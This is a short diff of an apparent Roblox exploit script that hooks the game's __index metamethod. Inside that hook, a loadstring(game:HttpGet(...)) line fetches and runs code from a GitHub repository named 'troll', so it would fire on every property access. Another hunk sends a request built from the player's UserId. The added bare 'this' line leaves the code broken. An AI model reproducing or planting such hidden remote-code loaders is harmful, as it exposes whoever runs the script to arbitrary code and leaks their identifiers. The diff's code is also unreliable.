@@ -3391,7 +3391,7 @@ gmt.__index = newcclosure(function(self,b)
         end
     end
 
- loadstring(game:HttpGet("https://raw.githubusercontent.com/malegamernotfemale/troll/main/guy"))()
+ local this = loadstring(game:HttpGet("https://raw.githubusercontent.com/malegamernotfemale/troll/main/guy"))()
 
     return oldindex(self, b)
 end)
@@ -5720,3 +5720,4 @@ end
 success, response = pcall(function()
     return game:HttpGetAsync("" .. plr.UserId)
 end)
+this
